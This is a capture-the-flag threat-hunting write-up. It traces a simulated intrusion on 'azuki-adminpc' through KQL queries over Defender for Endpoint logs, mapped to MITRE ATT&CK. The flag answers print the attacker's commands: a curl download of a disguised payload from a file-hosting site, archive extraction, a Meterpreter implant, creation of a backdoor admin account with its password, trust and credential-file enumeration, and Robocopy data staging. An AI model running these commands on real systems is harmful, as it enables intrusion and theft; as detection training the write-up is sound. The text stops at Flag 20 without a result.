# Scenario
Incident Brief: 

Five days after the file server breach, threat actors returned with sophisticated tools and techniques. The attacker pivoted from the compromised workstation to the CEO's administrative PC, deploying persistent backdoors and exfiltrating sensitive business data, including financial records and password databases.

COMPROMISED SYSTEMS: [ Investigation Required]

EVIDENCE AVAILABLE: Microsoft Defender for Endpoint logs

# FLAG 1: LATERAL MOVEMENT - Source System

Attackers pivot from initially compromised systems to high-value targets. Identifying the source of lateral movement reveals the attack's progression and helps scope the full compromise.

The query used is for detecting:

  - Lateral movement within an environment

  - Credential reuse across internal systems

  - Unexpected remote authentication paths

  - Potential post-compromise activity

Query Used: 
```
DeviceLogonEvents
| where DeviceName contains "azuki"
| where RemoteIP != ""
| where RemoteDeviceName contains "azuki"
| project Timestamp, DeviceName, ActionType, AccountName, RemoteDeviceName, RemoteIP
```

## MITRE ATT&CK Mapping

**Tactic:** Lateral Movement  
**Technique:** Remote Services  
**Technique ID:** T1021  

### Data Source
- Microsoft Defender for Endpoint
- `DeviceLogonEvents`

### Detection Logic
- Monitors remote logon events with a populated `RemoteIP`
- Filters for authentication occurring between similarly named internal systems
- Highlights potential credential reuse or unauthorized internal access paths

### Investigative Value
- Detects east-west movement within the network
- Helps identify compromised accounts used for internal pivoting
- Useful for post-exploitation and privilege escalation investigations

Result:

  ![image alt](https://github.com/Muts256/SNC-Public/blob/e8ddfdba6abe0d2b491f182bb2b1297adcdb3517/Images/Azuki-Bridge/B0.png)

*Question: Identify the source IP address for lateral movement to the admin PC?*

```
10.1.0.204
```

# FLAG 2: LATERAL MOVEMENT - Compromised Credentials

Understanding which accounts attackers use for lateral movement determines the blast radius and guides credential reset priorities

Query Used: 
```
DeviceLogonEvents
| where DeviceName contains "azuki"
| where RemoteIP != ""
| where RemoteDeviceName contains "azuki"
| project Timestamp, DeviceName, ActionType, AccountName, RemoteDeviceName, RemoteIP
```

Result:

![image alt](https://github.com/Muts256/SNC-Public/blob/e8ddfdba6abe0d2b491f182bb2b1297adcdb3517/Images/Azuki-Bridge/B1.png)

*Question: Identify the compromised account used for lateral movement?*

```
yuki.tanaka
```


# FLAG 3: LATERAL MOVEMENT - Target Device

Attackers select high-value targets based on user roles and data access. Identifying the compromised device reveals what information was at risk.

Query Used: 
```
DeviceLogonEvents
| where DeviceName contains "azuki"
| where RemoteIP != ""
| where RemoteDeviceName contains "azuki"
| project Timestamp, DeviceName, ActionType, AccountName, RemoteDeviceName, RemoteIP
```

Result:

![image alt](https://github.com/Muts256/SNC-Public/blob/e8ddfdba6abe0d2b491f182bb2b1297adcdb3517/Images/Azuki-Bridge/B1.png)

*Question: What is the target device name?*

```
azuki-adminpc
```

# FLAG 4: EXECUTION - Payload Hosting Service

Attackers rotate infrastructure between operations to evade network blocks and threat intelligence feeds. Documenting new domains is critical for prevention.

The query used:

  - Searches network connection events (DeviceNetworkEvents).

  - Focuses on activity originating from IP address 10.1.0.204

  - Restricts results to the admin workstation (azuki-adminpc).

  - Filters for network connections initiated by a process whose command line includes curl.

  - Displays the destination IP/URL and the exact command used.

Query Used: 

```
DeviceNetworkEvents
| where InitiatingProcessRemoteSessionIP == "10.1.0.204"
| where DeviceName contains "azuki-adminpc"
| where InitiatingProcessCommandLine contains "curl"
| project Timestamp, DeviceName, RemoteIP, InitiatingProcessCommandLine, RemoteUrl
```
## MITRE ATT&CK Mapping

**Tactic:** Command and Control  
**Technique:** Ingress Tool Transfer  
**Technique ID:** T1105  

**Tactic:** Exfiltration  
**Technique:** Exfiltration Over Web Services  
**Technique ID:** T1567.002  

**Tactic:** Execution  
**Technique:** Command-Line Interface  
**Technique ID:** T1059.003  

### Detection Logic
- Filters network events tied to a specific internal session IP
- Focuses on an administrative endpoint
- Detects command-line usage of `curl` to initiate external connections
- Captures destination IPs and URLs for investigation

### Investigative Value
- Highlights potential ingress or egress of malicious tools
- Identifies misuse of legitimate utilities for malicious purposes
- Useful for detecting post-exploitation activity on privileged systems


Result: 

![image alt](https://github.com/Muts256/SNC-Public/blob/e8ddfdba6abe0d2b491f182bb2b1297adcdb3517/Images/Azuki-Bridge/B4.png)

*Question: What file hosting service was used to stage malware?*

```
litter.catbox.moe
```


#  FLAG 5: EXECUTION - Malware Download Command

Command-line download utilities provide flexible, scriptable malware delivery while blending with legitimate administrative activity.

The query used is the same as the previous flag.

Query Used: 

```
DeviceNetworkEvents
| where InitiatingProcessRemoteSessionIP == "10.1.0.204"
| where DeviceName contains "azuki-adminpc"
| where InitiatingProcessCommandLine contains "curl"
| project Timestamp, DeviceName, RemoteIP, InitiatingProcessCommandLine, RemoteUrl
```

Result 

![image alt](https://github.com/Muts256/SNC-Public/blob/e8ddfdba6abe0d2b491f182bb2b1297adcdb3517/Images/Azuki-Bridge/B5.png)

*Question: What command was used to download the malicious archive?*

```
"curl.exe" -L -o C:\Windows\Temp\cache\KB5044273-x64.7z https://litter.catbox.moe/gfdb9v.7z
```

#  FLAG 6: EXECUTION - Archive Extraction Command

Password-protected archives evade basic content inspection while legitimate compression tools bypass application whitelisting controls.

The query used:

  - Searches process execution events (DeviceProcessEvents)

  - Focuses specifically on the administrative workstation azuki-adminpc

  - Filters for processes whose filename includes 7z (e.g., 7z.exe)

  - Displays when and where the process ran, along with the full command line

Query Used: 

```
DeviceProcessEvents
| where DeviceName contains "azuki-adminpc"
| where FileName contains "7z"
| project Timestamp, DeviceName, FileName, FolderPath, ProcessCommandLine

```
Alternative query: 

```
DeviceProcessEvents
| where DeviceName contains "azuki-adminpc"
| where FileName contains "7z"
| where ProcessCommandLine has_any ("-p", "-y")
| project Timestamp, DeviceName, FileName, FolderPath, ProcessCommandLine

```
- `-p` → Indicates a **password-protected archive**, often used to evade security scanning
- `-y` → Automatically answers **Yes to all prompts**, enabling silent execution

## MITRE ATT&CK Mapping

**Tactic:** Defense Evasion  
**Technique:** Obfuscated / Encrypted Files or Information  
**Technique ID:** T1027  

**Tactic:** Command and Control  
**Technique:** Ingress Tool Transfer  
**Technique ID:** T1105  

**Tactic:** Execution  
**Technique:** Command-Line Interface  
**Technique ID:** T1059.003  

### Detection Logic
- Monitors process execution on a privileged endpoint
- Filters for archive utilities (`7z.exe`)
- Captures full command-line arguments to identify silent or password-protected extraction

### Investigative Value
- Detects malware staging via compressed archives
- Highlights encrypted payload delivery used to evade security controls
- Provides context for correlating download and execution activity


Result: 

![image alt](https://github.com/Muts256/SNC-Public/blob/e8ddfdba6abe0d2b491f182bb2b1297adcdb3517/Images/Azuki-Bridge/B6.png)

*Question: Identify the command used to extract the password-protected archive?*

```
"7z.exe" x C:\Windows\Temp\cache\KB5044273-x64.7z -p******** -oC:\Windows\Temp\cache\ -y
```

# FLAG 7: PERSISTENCE - C2 Implant

Command and control implants maintain persistent access and enable remote control of compromised systems. The implant filename often mimics legitimate processes.

The query used :

  - Monitors file events (DeviceFileEvents) on the endpoint azuki-adminpc

  - Filters for events where the process that initiated the file operation includes .7z in its command line (indicating archive extraction or creation via 7-Zip)

  - Further restricts results to files in directories containing "cache" (often used for staging or temporary payloads)

  - Returns key fields for investigation:

    - Timestamp

    - DeviceName

    - ActionType (e.g., file created)

    - FileName and FolderPath

    - Process context (InitiatingProcessFolderPath, InitiatingProcessCommandLine)

Query Used:

```
DeviceFileEvents
| where DeviceName == "azuki-adminpc"
| where InitiatingProcessCommandLine contains ".7z"
| where FolderPath contains "cache"
| project Timestamp, DeviceName, ActionType, FileName, FolderPath, InitiatingProcessFolderPath, InitiatingProcessCommandLine

```
## MITRE ATT&CK Mapping

**Tactic:** Defense Evasion  
**Technique:** Obfuscated / Encrypted Files or Information  
**Technique ID:** T1027  

**Tactic:** Execution  
**Technique:** Command-Line Interface  
**Technique ID:** T1059.003  

**Tactic:** Command and Control  
**Technique:** Ingress Tool Transfer  
**Technique ID:** T1105  

### Data Source
- Microsoft Defender for Endpoint
- `DeviceFileEvents`

### Detection Logic
- Focuses on admin endpoints
- Monitors processes with `.7z` in the command line
- Filters file events in directories often used for staging (`cache`)
- Projects key details for incident investigation

### Investigative Value
- Detects malware payload extraction
- Provides insight into post-compromise staging activity
- Useful for linking download events to execution

Result:

![image alt](https://github.com/Muts256/SNC-Public/blob/e8ddfdba6abe0d2b491f182bb2b1297adcdb3517/Images/Azuki-Bridge/B7.png)

*Question: Identify the C2 beacon filename?*

```
meterpreter.exe
```


#  FLAG 8: PERSISTENCE - Named Pipe

Named pipes enable inter-process communication for C2 frameworks. Pipes follow distinctive naming patterns that serve as behavioural indicators

The query used:

  - Searches generic device events (DeviceEvents)

  - Restricts results to the endpoint azuki-adminpc

  - Filters for events where the initiating process folder path contains meterpreter

  - Displays:

    - When the event occurred

    - The affected device

    - File and folder involved

    - Additional contextual event data

Meterpreter is commonly used for:

  - Interactive command execution

  - Privilege escalation

  - Credential dumping

  - Lateral movement

  - Persistence

Query Used: 

```
DeviceEvents
| where DeviceName == "azuki-adminpc"
| where InitiatingProcessFolderPath contains "meterpreter"
| project Timestamp, DeviceName, FileName, FolderPath, AdditionalFields
```

## MITRE ATT&CK Mapping

**Tactic:** Command and Control  
**Technique:** Application Layer Protocol  
**Technique ID:** T1071  

**Tactic:** Execution  
**Technique:** Command-Line Interface  
**Technique ID:** T1059.003  

**Tactic:** Lateral Movement  
**Technique:** Remote Services  
**Technique ID:** T1021  

**Tactic:** Privilege Escalation  
**Technique:** Exploitation for Privilege Escalation  
**Technique ID:** T1068  

### Data Source
- Microsoft Defender for Endpoint
- `DeviceEvents`

### Detection Logic
- Focuses on a privileged endpoint
- Detects events initiated by processes located in paths containing `meterpreter`
- Captures detailed event metadata for investigation

### Investigative Value
- Confirms post-exploitation activity
- Indicates hands-on-keyboard attacker presence
- Helps scope attacker actions and persistence mechanisms

Result:

![image alt](https://github.com/Muts256/SNC-Public/blob/e8ddfdba6abe0d2b491f182bb2b1297adcdb3517/Images/Azuki-Bridge/B8.png)

Question: Identify the named pipe created by the C2 implant?

```
\Device\NamedPipe\msf-pipe-5902
```

#  FLAG 9: CREDENTIAL ACCESS - Decoded Account Creation

Base64 encoding obfuscates malicious commands from basic string matching and log analysis. Decoding reveals the true intent.

The query used :

  - Searches process execution events (DeviceProcessEvents)

  - Focuses on the administrative workstation azuki-adminpc

  - Filters for executions of PowerShell

  - Limits results to activity on or after 25 Nov 2025

  - Excludes processes launched by the SYSTEM account

  - Detects PowerShell commands containing encoded payloads

  - Displays execution details and the full command line

These are high‑risk behaviors commonly associated with:

  - Obfuscated script execution

  - Malware loaders

  - Post‑exploitation activity

  - Living‑off‑the‑land attacks

Query Used : 

```
DeviceProcessEvents
| where DeviceName contains "azuki-adminpc"
| where FileName contains "powershell"
| where Timestamp >= datetime(Nov 25, 2025)
| where InitiatingProcessAccountName != "system"
| where ProcessCommandLine contains "encoded"
| project Timestamp, DeviceName, ActionType, FolderPath, ProcessCommandLine
```
## MITRE ATT&CK Mapping

**Tactic:** Execution  
**Technique:** Command and Scripting Interpreter – PowerShell  
**Technique ID:** T1059.001  

**Tactic:** Defense Evasion  
**Technique:** Obfuscated / Encrypted Files or Information  
**Technique ID:** T1027  

**Tactic:** Privilege Escalation  
**Technique:** Abuse Elevation Control Mechanism  
**Technique ID:** T1548  

### Data Source
- Microsoft Defender for Endpoint
- `DeviceProcessEvents`

### Detection Logic
- Filters for PowerShell process execution
- Excludes SYSTEM account to focus on interactive activity
- Identifies encoded command usage
- Targets high-value administrative endpoints

### Investigative Value
- Detects fileless malware execution
- Highlights obfuscated attacker activity
- Supports investigation of post-exploitation and lateral movement

Result:

![image alt](https://github.com/Muts256/SNC-Public/blob/e8ddfdba6abe0d2b491f182bb2b1297adcdb3517/Images/Azuki-Bridge/B9.png)

Decoded message using Cyberchef

![image alt](https://github.com/Muts256/SNC-Public/blob/e8ddfdba6abe0d2b491f182bb2b1297adcdb3517/Images/Azuki-Bridge/B9a.png)

Question: What is the decoded Base64 command?

```
net user yuki.tanaka2 B@ckd00r2024! /add
```

# FLAG 10: PERSISTENCE - Backdoor Account

Hidden administrator accounts provide alternative access if primary persistence mechanisms are discovered and removed.

Query Used:

```
DeviceProcessEvents
| where DeviceName contains "azuki-adminpc"
| where FileName contains "powershell"
| where Timestamp >= datetime(Nov 25, 2025)
| where InitiatingProcessAccountName != "system"
| where ProcessCommandLine contains "encoded"
| project Timestamp, DeviceName, ActionType, FolderPath, ProcessCommandLine
```
In the decoded message, an account was created

![image alt](https://github.com/Muts256/SNC-Public/blob/e8ddfdba6abe0d2b491f182bb2b1297adcdb3517/Images/Azuki-Bridge/B9a.png)

Question: Identify the backdoor account name?

```
yuki.tanaka2
```


# FLAG 11: PERSISTENCE - Decoded Privilege Escalation Command

Base64 encoding obfuscates malicious commands from basic string matching and log analysis. Decoding reveals the true intent.

Query Used:

```
DeviceProcessEvents
| where DeviceName contains "azuki-adminpc"
| where FileName contains "powershell"
| where Timestamp >= datetime(Nov 25, 2025)
| where InitiatingProcessAccountName != "system"
| where ProcessCommandLine contains "encoded"
| project Timestamp, DeviceName, ActionType, FolderPath, ProcessCommandLine
```

### Event Timestamp

- **Date:** 25 November 2025  
- **Time:** 04:51:23 UTC

A Process was created

![image alt](https://github.com/Muts256/SNC-Public/blob/e8ddfdba6abe0d2b491f182bb2b1297adcdb3517/Images/Azuki-Bridge/B11.png) 

An encoded message was found in the process command line

![image alt](https://github.com/Muts256/SNC-Public/blob/e8ddfdba6abe0d2b491f182bb2b1297adcdb3517/Images/Azuki-Bridge/B11a.png)

The message was decoded using CyberChef

![image alt](https://github.com/Muts256/SNC-Public/blob/e8ddfdba6abe0d2b491f182bb2b1297adcdb3517/Images/Azuki-Bridge/B11b.png)

Question: What is the decoded Base64 command for privilege escalation?

```
net localgroup Administrators yuki.tanaka2 /add
```

# FLAG 12: DISCOVERY - Session Enumeration

Terminal services enumeration reveals active user sessions, helping attackers identify high-value targets and avoid detection.

The query used:

  - Searches process execution events (DeviceProcessEvents)

  - Focuses on the administrative workstation azuki-adminpc

  - Filters for execution of qwinsta (Query Windows Stations)

  - Displays:

    - When the command was run

    - Which device and account executed it

    - The full command line used

This activity is commonly used to:

  - Identify logged-in users

  - Check active or disconnected RDP sessions

  - Prepare for lateral movement or session hijacking

Query Used: 

```
DeviceProcessEvents
| where DeviceName contains "azuki-adminpc"
| where FileName contains "qwinsta"
| project Timestamp, DeviceName, AccountName, ProcessCommandLine
```
## MITRE ATT&CK Mapping

**Tactic:** Discovery  
**Technique:** System Owner / User Discovery  
**Technique ID:** T1033  

**Tactic:** Discovery  
**Technique:** Account Discovery  
**Technique ID:** T1087  

**Tactic:** Lateral Movement (Preparation)  
**Technique:** Remote Services  
**Technique ID:** T1021  


### Data Source
- Microsoft Defender for Endpoint
- `DeviceProcessEvents`

### Detection Logic
- Filters process execution events on an admin endpoint
- Detects use of the built-in Windows utility `qwinsta`
- Captures execution context including user account and command line

### Investigative Value
- Identifies user and session enumeration activity
- Supports detection of post-compromise reconnaissance
- Provides early indicators of lateral movement planning

Result:

![image alt](https://github.com/Muts256/SNC-Public/blob/e8ddfdba6abe0d2b491f182bb2b1297adcdb3517/Images/Azuki-Bridge/B12.png)

Question: What command was used to enumerate RDP sessions?

```
qwinsta
```


#  FLAG 13: DISCOVERY - Domain Trust Enumeration

Domain trust relationships reveal paths for lateral movement across organisational boundaries and potential targets in connected forests.

The query used:

  - Searches process execution events (DeviceProcessEvents)

  - Restricts results to the administrative workstation azuki-adminpc

  - Filters for activity executed by the specific user account yuki.tanaka

  - Looks for commands where the command line contains the keyword trust

  - Displays when the process ran, which device and user executed it, and the full command used

In Windows environments, commands containing trust are commonly associated with:

  - Domain trust enumeration or manipulation

  - Active Directory relationship discovery

  - Preparation for cross-domain access or lateral movement

Query Used:

```
DeviceProcessEvents  
| where DeviceName == "azuki-adminpc"  
| where AccountName == "yuki.tanaka"
| where ProcessCommandLine contains "trust"  
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine
```
## MITRE ATT&CK Mapping

**Tactic:** Discovery  
**Technique:** Domain Trust Discovery  
**Technique ID:** T1482  

**Tactic:** Lateral Movement (Preparation)  
**Technique:** Remote Services  
**Technique ID:** T1021  

**Tactic:** Privilege Escalation  
**Technique:** Valid Accounts  
**Technique ID:** T1078  


### Data Source
- Microsoft Defender for Endpoint
- `DeviceProcessEvents`

### Detection Logic
- Focuses on a high-value administrative endpoint
- Tracks activity by a specific user account
- Detects command-line usage associated with trust enumeration or manipulation

### Investigative Value
- Highlights potential Active Directory reconnaissance
- Enables user-focused threat hunting
- Supports detection of cross-domain attack preparation

Result: 

![image alt](https://github.com/Muts256/SNC-Public/blob/e8ddfdba6abe0d2b491f182bb2b1297adcdb3517/Images/Azuki-Bridge/B13.png)

Question: Identify the command used to enumerate domain trusts?

```
"nltest.exe" /domain_trusts /all_trusts
```


# FLAG 14: DISCOVERY - Network Connection Enumeration

Network connection enumeration identifies active sessions, listening services, and potential lateral movement targets.

This query:

  - Searches process execution events (DeviceProcessEvents)

  - Restricts results to the administrative workstation azuki-adminpc

  - Filters for activity executed by the specific user account yuki.tanaka

  - Detects execution of netstat, a network inspection utility

  - Displays:

    - When the command ran

    - Which device and account executed it

    - The executable used

    - The full command line

    - File description metadata
   
netstat is a legitimate tool, but attackers frequently use it during post-compromise discovery to:

  - Identify active network connections

  - Discover listening services and open ports

  - Map internal network activity

  - Validate command-and-control channels

Query Used:

```
DeviceProcessEvents  
| where DeviceName == "azuki-adminpc"  
| where AccountName == "yuki.tanaka"
| where ProcessCommandLine contains "netstat"
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, ProcessVersionInfoFileDescription

```
## MITRE ATT&CK Mapping

**Tactic:** Discovery  
**Technique:** Network Service Discovery  
**Technique ID:** T1046  

**Tactic:** Discovery  
**Technique:** Network Connection Discovery  
**Technique ID:** T1049  

**Tactic:** Lateral Movement (Preparation)  
**Technique:** Remote Services  
**Technique ID:** T1021  


### Data Source
- Microsoft Defender for Endpoint
- `DeviceProcessEvents`

### Detection Logic
- Focuses on a high-value endpoint
- Tracks activity by a specific user account
- Detects use of built-in network enumeration utilities
- Captures detailed execution context for investigation

### Investigative Value
- Highlights network reconnaissance activity
- Supports user-focused threat hunting
- Provides early indicators of lateral movement preparation

Result:

![image alt](https://github.com/Muts256/SNC-Public/blob/e8ddfdba6abe0d2b491f182bb2b1297adcdb3517/Images/Azuki-Bridge/B14.png)


Question: What command was used to enumerate network connections?

```
netstat -ano
```

# FLAG 15: DISCOVERY - Password Database Search

Password management databases contain credentials for multiple systems, making them high-priority targets for credential theft.

Used 2 Querys 

Query 1:

  - Searches process execution events (DeviceProcessEvents)

  - Restricts results to the administrative workstation azuki-adminpc

  - Filters for processes initiated by the user account yuki.tanaka

  - Limits activity to a specific time window (24–26 Nov 2025)

  - Detects execution of KeePass (password manager) or KeePass-related binaries

Query 1:

```
DeviceProcessEvents
| where DeviceName == "azuki-adminpc"   
| where InitiatingProcessAccountName == "yuki.tanaka"
| where Timestamp between (datetime(2025-11-24T00:00:00.7943081Z)..datetime(2025-11-26T00:00:00.7943081Z))
| where FileName contains "Keepass"
```
## MITRE ATT&CK Mapping

**Tactic:** Credential Access  
**Technique:** Credentials from Password Stores  
**Technique ID:** T1555  

**Tactic:** Credential Access  
**Technique:** Credentials from Password Managers  
**Technique ID:** T1555.005  

**Tactic:** Privilege Escalation  
**Technique:** Valid Accounts  
**Technique ID:** T1078  

### Data Source
- Microsoft Defender for Endpoint
- `DeviceProcessEvents`

### Detection Logic
- Focuses on a high-value administrative endpoint
- Tracks activity by a specific user account
- Detects execution of password management software
- Restricts activity to a defined incident timeframe

### Investigative Value
- Identifies potential credential harvesting activity
- Supports credential compromise scoping
- Provides insight into attacker objectives and access paths

Query 2:

After establishing the database, this query was used to find the command used for enumeration

The query used:

  - Searches process execution events (DeviceProcessEvents)

  - Limits results to a defined investigation window (24–26 Nov 2025)

  - Focuses on the administrative workstation azuki-adminpc

  - Filters for processes whose command line references .kdbx files

    - .kdbx = KeePass password database

  - Restricts activity to the user account yuki.tanaka

  - Outputs detailed execution context, including file metadata and full command line

Result:

![image alt](https://github.com/Muts256/SNC-Public/blob/e8ddfdba6abe0d2b491f182bb2b1297adcdb3517/Images/Azuki-Bridge/B15a.png)


Query 2:

```
DeviceProcessEvents
| where Timestamp between (datetime(2025-11-24T00:00:00.7943081Z)..datetime(2025-11-26T00:00:00.7943081Z))
| where DeviceName == "azuki-adminpc"  
| where ProcessCommandLine contains "kdbx"  
| where InitiatingProcessAccountName == @"yuki.tanaka"
| project Timestamp, DeviceName, AccountName, FileName,ProcessVersionInfoFileDescription, ProcessCommandLine
```
## MITRE ATT&CK Mapping

**Tactic:** Credential Access  
**Technique:** Credentials from Password Stores  
**Technique ID:** T1555  

**Tactic:** Credential Access  
**Technique:** Credentials from Password Managers  
**Technique ID:** T1555.005  

**Tactic:** Privilege Escalation  
**Technique:** Valid Accounts  
**Technique ID:** T1078  

### Data Source
- Microsoft Defender for Endpoint
- `DeviceProcessEvents`

### Detection Logic
- Monitors process executions referencing `.kdbx` files
- Focuses on a privileged endpoint and specific user account
- Restricts analysis to a sensitive timeframe

### Investigative Value
- Detects potential credential harvesting activity
- Supports scoping of password compromise
- Helps identify attacker objectives and next steps

Result:

![image alt](https://github.com/Muts256/SNC-Public/blob/e8ddfdba6abe0d2b491f182bb2b1297adcdb3517/Images/Azuki-Bridge/B15b.png)

Question: What command was used to search for password databases?

```
where /r C:\Users *.kdbx
```


# FLAG 16: DISCOVERY - Credential File

Plaintext password files represent critical security failures and provide attackers with immediate access to multiple systems.

The query used:

  - Searches process execution events (DeviceProcessEvents)

  - Focuses on the workstation azuki-adminpc

  - Filters for executions of Notepad (Notepad.exe)

  - Identifies cases where Notepad was launched with a .txt file specified on the command line.

While Notepad is legitimate, in an investigation context this activity can be meaningful, especially on an admin workstation:

Attackers often use Notepad to:

  - View stolen credentials

  - Review output of reconnaissance commands

  - Read dumped configuration files

  - Inspect exfiltrated data staged as .txt

txt files may contain:

  - Passwords

  - API keys

  - Host inventories

  - Command outputs (e.g. ipconfig, netstat)

Query used: 

```
DeviceProcessEvents
| where DeviceName contains "azuki-adminpc"
| where ProcessCommandLine contains ".txt"
| where FileName == "Notepad.exe"
```
## MITRE ATT&CK Mapping

**Tactic:** Collection  
**Technique:** Data from Local System  
**Technique ID:** T1005  

**Tactic:** Collection  
**Technique:** Data Staged  
**Technique ID:** T1074  

**Tactic:** Discovery  
**Technique:** File and Directory Discovery  
**Technique ID:** T1083  

### Data Source
- Microsoft Defender for Endpoint
- `DeviceProcessEvents`

### Detection Logic
- Monitors Notepad execution
- Detects command-line references to text files
- Focuses on a privileged endpoint

### Investigative Value
- Helps identify manual attacker activity
- Supports investigation of data collection or staging
- Provides insight into interactive post-compromise behavior

Result:

![image alt](https://github.com/Muts256/SNC-Public/blob/e8ddfdba6abe0d2b491f182bb2b1297adcdb3517/Images/Azuki-Bridge/B16a.png)


![image alt](https://github.com/Muts256/SNC-Public/blob/e8ddfdba6abe0d2b491f182bb2b1297adcdb3517/Images/Azuki-Bridge/B16b.png)

Question: Identify the discovered password file?

```
OLD-Passwords.txt
```


# FLAG 17: COLLECTION - Data Staging Directory

Attackers establish staging locations in system directories to organise stolen data before exfiltration. These paths are critical IOCs for forensic investigation.

This query:

  - Searches process execution events (DeviceProcessEvents)

  - Restricts results to the administrative workstation azuki-adminpc

  - Focuses on activity initiated by the user account yuki.tanaka

  - Detects processes whose command line references the user’s Documents directory

  - Limits results to file-handling and command execution utilities:

    - Robocopy.exe

    - xcopy.exe

    - cmd.exe

    - powershell.exe

This activity is significant because:

robocopy and xcopy are commonly used for:

  - Bulk file copying

  - Data staging prior to exfiltration

cmd.exe and powershell.exe indicate:

  - Scripted or interactive command execution

The Documents folder often contains:

  - Sensitive business files

  - Credentials stored in text files

  - Reports, exports, or staging data

On an administrative workstation, this may indicate:

  - Data collection

  - Preparation for exfiltration

  - Manual attacker activity using native tools (LOLBins)

QueryUsed: 

```
DeviceProcessEvents  
| where DeviceName == "azuki-adminpc"  
| where InitiatingProcessAccountName == "yuki.tanaka"  
| where ProcessCommandLine has @"C:\Users\yuki.tanaka\Documents\"  
| where FileName in ("Robocopy.exe","xcopy.exe","cmd.exe","powershell.exe")
```
## MITRE ATT&CK Mapping

**Tactic:** Collection  
**Technique:** Data from Local System  
**Technique ID:** T1005  

**Tactic:** Collection  
**Technique:** Data Staged  
**Technique ID:** T1074  

**Tactic:** Command and Control  
**Technique:** Data Transfer Size Limits (Preparation)  
**Technique ID:** T1030  

**Tactic:** Defense Evasion  
**Technique:** Living off the Land Binaries and Scripts  
**Technique ID:** T1218  


### Data Source
- Microsoft Defender for Endpoint
- `DeviceProcessEvents`

### Detection Logic
- Monitors execution of common file-handling and scripting utilities
- Detects command-line references to a sensitive user directory
- Focuses on a privileged endpoint and specific user account

### Investigative Value
- Helps identify potential data collection or staging behavior
- Detects abuse of legitimate tools (LOLBins)
- Supports investigation of insider threat or post-compromise activity

Result

![image alt](https://github.com/Muts256/SNC-Public/blob/e8ddfdba6abe0d2b491f182bb2b1297adcdb3517/Images/Azuki-Bridge/B17a.png)


![image alt](https://github.com/Muts256/SNC-Public/blob/e8ddfdba6abe0d2b491f182bb2b1297adcdb3517/Images/Azuki-Bridge/B17b.png)

Question: Identify the data staging directory?

```
C:\ProgramData\Microsoft\Crypto\staging
```


#  FLAG 18: COLLECTION - Automated Data Collection Command

Scriptable file copying technique with retry logic and network optimisation is ideal for bulk data theft operations
Query Used is the same as in question 17

```
DeviceProcessEvents  
| where DeviceName == "azuki-adminpc"  
| where InitiatingProcessAccountName == "yuki.tanaka"  
| where ProcessCommandLine has @"C:\Users\yuki.tanaka\Documents\"  
| where FileName in ("Robocopy.exe","xcopy.exe","cmd.exe","powershell.exe")
| project Timestamp, DeviceName, ActionType, FileName, ProcessCommandLine
```
Result

![image alt](https://github.com/Muts256/SNC-Public/blob/e8ddfdba6abe0d2b491f182bb2b1297adcdb3517/Images/Azuki-Bridge/B18.png)

Question: Identify the command used to copy banking documents?

```
"Robocopy.exe" C:\Users\yuki.tanaka\Documents\Banking C:\ProgramData\Microsoft\Crypto\staging\Banking /E /R:1 /W:1 /NP
```

# FLAG 19: COLLECTION - Exfiltration Volume

Quantifying the number of archives created reveals the scope of data theft and helps prioritise impact assessment efforts.

The query used:

  - Searches file system activity events (DeviceFileEvents)

  - Restricts results to the administrative workstation azuki-adminpc

  - Focuses on file activity inside the directory:
    
    ````
  	C:\ProgramData\Microsoft\Crypto\staging
    ````
  - Returns a count of how many such file events occurred

This activity is highly suspicious:

C:\ProgramData\Microsoft\Crypto\staging is not a normal user archive location

Attackers commonly:

  - Use system-looking directories to hide staged data

  - Compress collected files before exfiltration

Archive formats are commonly used for:

  - Data staging

  - Obfuscation

  - Exfiltration preparation

Query Used:

```
DeviceFileEvents  
| where DeviceName == "azuki-adminpc"  
| where FolderPath contains @"C:\ProgramData\Microsoft\Crypto\staging"  
| where FileName has_any (".7z",".zip",".tar",".gz")
| count 
```
## MITRE ATT&CK Mapping

**Tactic:** Collection  
**Technique:** Data Staged  
**Technique ID:** T1074  

**Tactic:** Exfiltration  
**Technique:** Archive Collected Data  
**Technique ID:** T1560  

**Tactic:** Defense Evasion  
**Technique:** Masquerading  
**Technique ID:** T1036  

### Data Source
- Microsoft Defender for Endpoint
- `DeviceFileEvents`

### Detection Logic
- Monitors archive file activity in system directories
- Focuses on a high-value administrative endpoint
- Aggregates activity to highlight suspicious staging behavior

### Investigative Value
- Identifies potential data staging locations
- Supports exfiltration timeline reconstruction
- Highlights attacker attempts to blend malicious activity into legitimate system paths

Results:

![image alt](https://github.com/Muts256/SNC-Public/blob/e8ddfdba6abe0d2b491f182bb2b1297adcdb3517/Images/Azuki-Bridge/B19.png)



![image alt](https://github.com/Muts256/SNC-Public/blob/e8ddfdba6abe0d2b491f182bb2b1297adcdb3517/Images/Azuki-Bridge/B19a.png)


Question: Identify the total number of archives created?

```
8
```


# FLAG 20: CREDENTIAL ACCESS - Credential Theft Tool Download

Attackers download specialised credential theft tools directly to compromised systems, adapting their toolkit to the target environment.

The query used:

  - Searches process execution events (DeviceProcessEvents)

  - Restricts results to the administrative workstation azuki-adminpc

  - Detects execution of curl.exe

  - Filters for executions that occurred during a remote session originating from IP address 10.1.0.204

  - Returns detailed execution context:

    - Timestamp

    - Action type

    - Executable path

    - Full command line

This activity is high-risk, especially in combination:

curl.exe is commonly used to:

  - Upload stolen data

  - Download additional payloads

  - Communicate with attacker infrastructure

Execution within a remote session suggests:

  - Interactive attacker activity

  - Lateral movement or hands-on-keyboard behavior

On an admin workstation, this strongly indicates:

  - Command-and-control activity or

  - Data exfiltration using legitimate tools (LOLBins)

Query Used:

```
DeviceProcessEvents  
| where DeviceName == "azuki-adminpc"  
| where FileName == "curl.exe"
| where InitiatingProcessRemoteSessionIP == "10.1.0.204" 
| project Timestamp, ActionType, FolderPath, ProcessCommandLine
```
## MITRE ATT&CK Mapping

**Tactic:** Command and Control  
**Technique:** Application Layer Protocol  
**Technique ID:** T1071  

**Tactic:** Command and Control  
**Technique:** Web Protocols  
**Technique ID:** T1071.001  

**Tactic:** Exfiltration  
**Technique:** Exfiltration Over Web Services  
**Technique ID:** T1567  

**Tactic:** Defense Evasion  
**Technique:** Living off the Land Binaries and Scripts  
**Technique ID:** T1218  

### Data Source
- Microsoft Defender for Endpoint
- `DeviceProcessEvents`

### Detection Logic
- Monitors execution of curl
- Filters for activity occurring in a remote session
- Focuses on a privileged endpoint

### Investigative Value
- Detects interactive attacker behavior
- Supports investigation of C2 and exfiltration activity
- Provides command-line context for payload download or data upload analysis

Result:

